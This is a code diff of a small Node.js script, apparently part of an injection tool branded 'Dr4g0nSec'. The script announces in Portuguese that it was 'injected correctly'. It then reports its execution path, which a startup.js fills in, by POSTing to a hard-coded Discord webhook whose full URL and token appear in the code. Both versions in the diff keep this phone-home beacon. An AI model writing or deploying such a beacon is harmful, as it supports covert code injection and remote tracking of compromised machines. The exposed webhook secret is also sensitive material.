@@ -1,40 +1,18 @@
 const https = require("https");
 
-// Webhook URL (adicione sua URL aqui)
-const WEBHOOK_URL = "https://ptb.discord.com/api/webhooks/1364799028465762366/qzpcr49Fg_tn70rrgOvoEWY9RLnWnOJo0CoYNqt0N1dJXlK8vhpqS16na7rvqK8xj30l";
-
-// Caminho local onde o script está executando (substituído pelo startup.js)
-const localPath = "%LOCAL%";
-
-// Dados da mensagem a enviar para o webhook
-const postData = JSON.stringify({
-  content: `Olá, fui injetado aqui corretamente! e estou pronto para testes :)\n📍 Local: ${localPath}`
-});
-
-const url = new URL(WEBHOOK_URL);
-
-const options = {
-  hostname: url.hostname,
-  path: url.pathname + url.search,
-  method: "POST",
-  headers: {
-    "Content-Type": "application/json",
-    "Content-Length": Buffer.byteLength(postData),
-  }
+const webhook = "https://ptb.discord.com/api/webhooks/1364799028465762366/qzpcr49Fg_tn70rrgOvoEWY9RLnWnOJo0CoYNqt0N1dJXlK8vhpqS16na7rvqK8xj30l";
+const mensagem = {
+  content: "Olá, fui injetado aqui corretamente! e estou pronto para testes :)",
+  embeds: [{
+    title: "Dr4g0nSec",
+    description: "Executado em: %LOCAL%",
+    color: 0x00ff00
+  }]
 };
 
-const req = https.request(options, (res) => {
-  // Opcional: confirmar sucesso no console
-  if (res.statusCode === 204) {
-    console.log("✅ Mensagem enviada para a webhook com sucesso.");
-  } else {
-    console.error(`⚠️ Falha ao enviar mensagem, status code: ${res.statusCode}`);
-  }
+const req = https.request(webhook, {
+  method: "POST",
+  headers: { "Content-Type": "application/json" }
 });
-
-req.on("error", (e) => {
-  console.error(`Erro ao enviar para webhook: ${e.message}`);
-});
-
-req.write(postData);
+req.write(JSON.stringify(mensagem));
 req.end();
